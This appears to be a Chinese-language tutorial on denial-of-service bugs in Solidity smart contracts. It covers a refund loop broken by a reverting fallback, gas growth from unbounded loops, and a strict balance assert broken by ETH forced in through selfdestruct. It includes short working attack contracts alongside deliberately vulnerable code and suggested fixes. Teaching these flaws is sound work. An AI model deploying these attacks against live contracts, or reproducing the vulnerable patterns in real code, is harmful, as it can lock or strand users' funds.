# DoS

拒绝服务（Denial of Service, DoS）漏洞，是恶意合约或者本身合约逻辑漏洞导致的合约全部或部分功能无法正常使用。DoS产生的原因有非常多，这里只举几个经典的例子：

#### 1.恶意revert导致DoS

来自于一个简化了的 Akutar 合约，名字叫 `DoSGame`。这个合约逻辑很简单，游戏开始时，玩家们调用 `deposit()` 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，`refund()`函数被调用，将 ETH 依次退款给所有玩家

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;

    // 所有玩家存ETH到合约里
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // 记录存款
        balanceOf[msg.sender] = msg.value;
        // 记录玩家地址
        players.push(msg.sender);
    }

//以下的for循环出现了巨大的漏洞
    // 游戏结束，退款开始，所有玩家将依次收到退款
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // 通过循环给所有玩家退款
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player];
 //！！！！！！逻辑问题出现，如果call返回个false,这个函数全废掉！！！！！！！！！！！！！！！！
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}
```

这里的漏洞在于，`refund()` 函数中利用循环退款的时候，是使用的 `call` 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。

例如下面的合约，我拿合约存的钱，refund后call会调起fallback/receive，加个revert，call返回false，require回滚结果，refund函数全废掉，没有一个人的钱能拿回来：

```Solidity
contract Attack {
    // 退款时进行DoS攻击
    fallback() external payable{
        revert("DoS Attack!");
    }

    // 参与DoS游戏并存款
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}
//解决方法也简单，去掉require，或者for循环去掉，改为用户主动取现就没这种事了
```

除此之外，for循环本身也有个大毛病，就算会随着数组长度而增加gas消耗，导致潜在的问题

```Solidity
function enter() public {
    // Check for duplicate entrants
    for (uint256 i; i < entrants.length; i++) {
        if (entrants[i] == msg.sender) {
            revert("You've already entered!");
        }
    }
    entrants.push(msg.sender);
}
//谁都能进很快这个就会很长，应该改成mapping来解决这个问题.
```

#### 2.恶意发钱导致DoS

当出现assert/require核对总余额时需要注意，这种判断有潜在bug

```Solidity
///github.com/Cyfrin/sc-exploits-minimized/blob/main/src/mishanding-of-eth/SelfDestructMe.sol提供的案例

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract SelfDestructMe {
    uint256 public totalDeposits;
    mapping(address => uint256) public deposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw() external {
        assert(address(this).balance == totalDeposits); // bad,应该至少改成大于等于
        uint256 amount = deposits[msg.sender];
        totalDeposits -= amount;
        deposits[msg.sender] = 0;

        payable(msg.sender).transfer(amount);
    }
}

contract AttackSelfDestructMe {
    SelfDestructMe target;

    constructor(SelfDestructMe _target) payable {
        target = _target;
    }

    function attack() external payable {
        selfdestruct(payable(address(target)));
    }
}
///合约自毁或者将目标合约地址设为beacon chain验证节点的收钱地址都会导致强制收钱
```

看上去上面的ETH只能通过`deposit`来转入合约，而等于号会一直保持，但是EVM机制中，`selfDestruct`合约销毁函数和beacon chain将合约地址设置为质押奖励接收地址（ 参考[ETH2Book](https://eth2book.info/capella/part2/deposits-withdrawals/withdrawal-processing/#performing-withdrawals)）都会导致不等号不成立，这两个机制都会强制对合约进行转账，导致DoS。